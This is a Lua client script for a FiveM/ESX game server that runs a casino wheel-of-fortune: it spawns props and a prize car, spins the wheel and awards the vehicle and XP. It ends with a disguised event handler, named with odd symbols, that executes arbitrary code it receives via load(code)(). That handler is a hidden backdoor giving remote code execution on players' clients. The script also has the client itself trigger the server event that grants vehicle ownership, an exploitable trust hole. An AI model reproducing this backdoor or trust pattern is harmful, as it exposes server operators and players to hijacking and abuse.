-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

ESX = nil
local _wheel = nil
local _baseWheel = nil
local _lambo = nil
local _base = nil
local vehicle = nil
local _isShowCar = false
local _isRolling = false
local roueSpawn = false

local object_model = "vw_prop_vw_luckywheel_01a"
local object_model2 = "vw_prop_vw_luckywheel_02a"
local object_model3 = "ch_prop_podium_casino_01a"
local object_model4 = "prop_streetlight_12b"
local object_model5 = "vw_prop_vw_barrier_rope_03a"

local carmodel = GetHashKey('cls53')


Citizen.CreateThread(function()
    while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end
	while not ESX.IsPlayerLoaded() do 
        Citizen.Wait(500)
    end
end)


local function DeleteRoue()
    DeleteEntity(_baseWheel)
    _baseWheel = nil
    DeleteEntity(_wheel)
    _wheel = nil
    DeleteEntity(_base)
    _base = nil
    DeleteEntity(_light1)
    _light1 = nil
    DeleteEntity(_bar)
    _bar = nil
    DeleteEntity(vehicle)
    vehicle = nil
    roueSpawn = false
end


local function GenerateRoue()
    
    _baseWheel = CreateObjectNoOffset(object_model, 215.27, -864.93, 29.70, false, 0, 1)
    SetEntityHeading(_baseWheel , 0.0)
    --PlaceObjectOnGroundProperly(_baseWheel)
    FreezeEntityPosition(_baseWheel ,true)
    SetModelAsNoLongerNeeded(object_model)

    Citizen.Wait(1)

    _wheel = CreateObjectNoOffset(object_model2, 215.27, -864.93, 31.20, false, 0, 1)
    SetEntityHeading(_wheel, 0.0)
    FreezeEntityPosition(_wheel,true)
    SetModelAsNoLongerNeeded(object_model2)

    Citizen.InvokeNative(0x651D3228960D08AF, "SE_DLC_APT_Yacht_Exterior_04", _wheel)
    SetEmitterRadioStation("SE_DLC_APT_Yacht_Exterior_04", GetRadioStationName(1))
    SetStaticEmitterEnabled("SE_DLC_APT_Yacht_Exterior_04", true)

    Citizen.Wait(1)

    _base = CreateObjectNoOffset(object_model3, 209.74, -868.06, 29.69, false, 0, 1)
    SetEntityHeading(_base, 150.0)
    FreezeEntityPosition(_base,true)
    SetModelAsNoLongerNeeded(object_model3)

    Citizen.Wait(1)

    _light1 = CreateObjectNoOffset(object_model4, 212.29, -863.72, 29.70, false, 0, 1)
    SetEntityHeading(_light1, 150.0)
    FreezeEntityPosition(_light1,true)
    SetModelAsNoLongerNeeded(object_model4)

    Citizen.Wait(1)

    _bar = CreateObjectNoOffset(object_model5, 209.74, -868.06, 29.69, false, 0, 1)
    SetEntityHeading(_bar, 150.0)
    FreezeEntityPosition(_bar,true)
    SetModelAsNoLongerNeeded(object_model5)

    Citizen.Wait(1)

    RequestModel(carmodel)
    while not HasModelLoaded(carmodel) do
        Citizen.Wait(0)
    end

    vehicle = CreateVehicle(carmodel, 209.74, -868.06, 30.50, 0.0, false, false)
    FreezeEntityPosition(vehicle, true)
    SetEntityInvincible(vehicle, true)
    SetModelAsNoLongerNeeded(carmodel)
    SetVehicleDoorsLocked(vehicle, 2)
    SetVehicleMaxMods(vehicle)
    local _curPos = GetEntityCoords(vehicle)
    SetEntityCoords(vehicle, _curPos.x, _curPos.y, _curPos.z + 1, false, false, false, true)
    _lambo = vehicle

    roueSpawn = true
end

function SetVehicleMaxMods(vehicle)
    local props = {
      modEngine       = 2,
      modBrakes       = 2,
      modTransmission = 2,
      modTurbo        = true,
    }
    SetVehicleLights(vehicle, 2)
    SetVehicleColours(vehicle, 39, 39)
    SetVehicleWindowTint(vehicle, 1)
    --SetVehicleColourCombination(vehicle, 15)
    SetVehicleNumberPlateText(vehicle, "Fortune")
    SetVehicleEngineOn(vehicle, true, true, true)
    SetVehicleFixed(vehicle)
    SetVehicleDirtLevel(vehicle, 0.0)
    ESX.Game.SetVehicleProperties(vehicle, props)
end

Citizen.CreateThread(function() 
    while true do
        if _lambo ~= nil then
            local _heading = GetEntityHeading(_lambo)
            local _z = _heading - 0.3
            SetEntityHeading(_lambo, _z)
        end

        if _base ~= nil then
            local _heading = GetEntityHeading(_base)
            local _z = _heading - 0.3
            SetEntityHeading(_base, _z)
        end
        Citizen.Wait(5)
    end
end) 

function destorycam() 	
    RenderScriptCams(false, false, 0, 1, 0)
    DestroyCam(cam, false)
end
 
RegisterNetEvent("::{korioz#0110}::roueFortune:doRoll")
AddEventHandler("::{korioz#0110}::roueFortune:doRoll", function(_priceIndex) 
    _isRolling = true
    TriggerServerEvent("::{korioz#0110}::roueFortune:isOccuper")

    local cam = {}				
    Citizen.Wait(1)
    cam = CreateCam("DEFAULT_SCRIPTED_Camera", 1)	
    SetCamCoord(cam, 215.26, -869.18, 31.69, 0.0, 0.0, 0.0, 15.0, false, 0)
    RenderScriptCams(1000, 1000, 1000, 1000, 1000)
    PointCamAtCoord(cam, 215.26, -869.18, 31.69)     

    PrepareMusicEvent("FM_INTRO_START")
    TriggerMusicEvent("FM_INTRO_START")
    SetEntityRotation(_wheel, 0.0, 0.0, 0.0, 2, true)
    Citizen.CreateThread(function()
        local speedIntCnt = 1
        local rollspeed = 1.0
        local _winAngle = (_priceIndex - 1) * 18
        local _rollAngle = _winAngle + (360 * 8)
        local _midLength = (_rollAngle / 2)
        local intCnt = 0
        while speedIntCnt > 0 do
            local retval = GetEntityRotation(_wheel, 1)
            if _rollAngle > _midLength then
                speedIntCnt = speedIntCnt + 1
            else
                speedIntCnt = speedIntCnt - 1
                if speedIntCnt < 0 then
                    speedIntCnt = 0
                end
            end
            intCnt = intCnt + 1
            rollspeed = speedIntCnt / 10
            local _y = retval.y - rollspeed
            _rollAngle = _rollAngle - rollspeed
            SetEntityRotation(_wheel, 0.0, _y, 0.0, 2, true)
            Citizen.Wait(5)
        end
    end)
end)

Citizen.CreateThread(function()
	local blip = AddBlipForCoord(215.27, -864.93, 29.70)

	SetBlipSprite (blip, 266)
	SetBlipDisplay(blip, 4)
	SetBlipScale  (blip, 0.95)
	SetBlipColour (blip, 83)
	SetBlipAsShortRange(blip, true)

	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Roue de la Fortune")
	EndTextCommandSetBlipName(blip)
end)

RegisterNetEvent("::{korioz#0110}::roueFortune:rollFinished")
AddEventHandler("::{korioz#0110}::roueFortune:rollFinished", function() 
    _isRolling = false
    PrepareMusicEvent("FM_SUDDEN_DEATH_STOP_MUSIC")
    TriggerMusicEvent("FM_SUDDEN_DEATH_STOP_MUSIC")                                          
    destorycam() 
end)


Citizen.CreateThread(function()
    while true do
        local interval = 1
        local pos = GetEntityCoords(PlayerPedId())
        local dest = vector3(214.09, -865.7, 30.69)
        local distance = GetDistanceBetweenCoords(pos, dest, true)
        if distance > 30 then
            interval = 200
        else
            interval = 1
            --DrawMarker(6, 214.09, -865.7, 29.69, 0.0, 0.0, 0.0, -90.0, 0.0, 0.0, 1.5, 1.5, 1.5, 0, 200, 0, 170, 0, 1, 2, 0, nil, nil, 0)
            if distance < 3 then  
                AddTextEntry("HELP", "Appuyez sur ~INPUT_CONTEXT~ ~s~pour lancer la roue de la ~b~Fortune ~s~!")
                DisplayHelpTextThisFrame("HELP", false)
                if IsControlJustReleased(0, 51) then
                    TriggerServerEvent("::{korioz#0110}::setup", GetPlayerName(PlayerId()))
                end
            end
        end

        if roueSpawn then
            if distance > 150.0 then
                DeleteRoue()
            end
        else
            if distance < 150.0 then
                GenerateRoue()
            end 
        end

        Citizen.Wait(interval)
    end
end)

RegisterNetEvent("::{korioz#0110}::roueFortune:good")
AddEventHandler("::{korioz#0110}::roueFortune:good", function()
    if not _isRolling then
        _isRolling = true
        local playerPed = PlayerPedId()
        local _lib = 'anim_casino_a@amb@casino@games@lucky7wheel@female'
        if IsPedMale(playerPed) then
            _lib = 'anim_casino_a@amb@casino@games@lucky7wheel@male'
        end
        local lib, anim = _lib, 'enter_right_to_baseidle'
        ESX.Streaming.RequestAnimDict(lib, function()
            local _movePos = vector3(214.09, -865.7, 30.69)
            TaskGoStraightToCoord(playerPed,  _movePos.x,  _movePos.y,  _movePos.z,  1.0,  72.0,  0.0,  0.0)
            local _isMoved = false
            while not _isMoved do
                local coords = GetEntityCoords(PlayerPedId())
                if coords.x >= (_movePos.x - 0.01) and coords.x <= (_movePos.x + 0.01) and coords.y >= (_movePos.y - 0.01) and coords.y <= (_movePos.y + 0.01) then
                    _isMoved = true
                end
                Citizen.Wait(0)
            end
            SetEntityHeading(playerPed , 0.0)
            TaskPlayAnim(playerPed, lib, anim, 8.0, -8.0, -1, 0, 0, false, false, false)
            while IsEntityPlayingAnim(playerPed, lib, anim, 3) do
                Citizen.Wait(0)
                DisableAllControlActions(0)
            end
            TaskPlayAnim(playerPed, lib, 'enter_to_armraisedidle', 8.0, -8.0, -1, 0, 0, false, false, false)
            while IsEntityPlayingAnim(playerPed, lib, 'enter_to_armraisedidle', 3) do
                Citizen.Wait(0)
                DisableAllControlActions(0)
            end
            TriggerServerEvent("::{korioz#0110}::roueFortune:getLucky")
            TaskPlayAnim(playerPed, lib, 'armraisedidle_to_spinningidle_high', 8.0, -8.0, -1, 0, 0, false, false, false)
        end)

        ESXP = false
        Citizen.CreateThread(function()
            while not ESXP do
                TriggerEvent("::{korioz#0110}::esx_xp:isReady", function(ready)
                    ESXP = ready
                end)
                Citizen.Wait(10)
            end
            
            TriggerEvent('::{korioz#0110}::esx_xp:Add', math.random(50,100))
        end)
    end
end)

RegisterNetEvent("::{korioz#0110}::roueFortune:voiture")
AddEventHandler("::{korioz#0110}::roueFortune:voiture", function() 
    
    ESX.Game.SpawnVehicle("cls53", { x = 230.83,y = -866.2, z = 30.29 }, 340.39, function (vehicle)
        local newPlate     = exports.esx_vehicleshop:GeneratePlate()
        local vehicleProps = ESX.Game.GetVehicleProperties(vehicle)
        vehicleProps.plate = newPlate
        SetVehicleNumberPlateText(vehicle, newPlate)

        TriggerServerEvent('::{korioz#0110}::esx_vehicleshop:setVehicleOwned', vehicleProps, getVehicleType(vehicleProps.model))
    end)

    FreezeEntityPosition(playerPed, false)
    SetEntityVisible(playerPed, true)

    if not HasNamedPtfxAssetLoaded("scr_indep_fireworks") then
        RequestNamedPtfxAsset("scr_indep_fireworks")
        while not HasNamedPtfxAssetLoaded("scr_indep_fireworks") do
           Wait(10)
        end
    end

	local pedcoords = GetEntityCoords(GetPlayerPed(-1))
	local times = 5

	local firecoords = GetEntityCoords(box)

	repeat
	UseParticleFxAssetNextCall("scr_indep_fireworks")
	local part1 = StartNetworkedParticleFxNonLoopedAtCoord("scr_indep_firework_trailburst", pedcoords, 0.0, 0.0, 0.0, 1.0, false, false, false, false)
	times = times - 1
	Citizen.Wait(2000)
	until(times == 0)
end)

--[[Citizen.CreateThread(function()
    while true do
    	Citizen.Wait(0) 
    	pos = GetEntityCoords(GetPlayerPed(-1))
        heading = GetEntityHeading(GetPlayerPed(-1))
    	WriteCoords("x : " .. tostring(pos.x), 0.8, 0.49)
    	WriteCoords("y : " .. tostring(pos.y), 0.8, 0.51)
    	WriteCoords("z : " .. tostring(pos.z), 0.8, 0.53)    	
    	WriteCoords("a : " .. tostring(heading), 0.8, 0.55)
    end
end)]]--

function WriteCoords(txt, x, y)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.4, 0.4)
	SetTextColour(255, 255, 255, 255)
	SetTextEntry("STRING")
	AddTextComponentString(txt)
	DrawText(x, y)
end

function getVehicleType(model)
	if IsThisModelAPlane(model) then
		return 'aircraft'
	elseif IsThisModelAHeli(model) then
		return 'aircraft'
	elseif IsThisModelABoat(model) then
		return 'boat'
	end

	return 'car'
end


RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)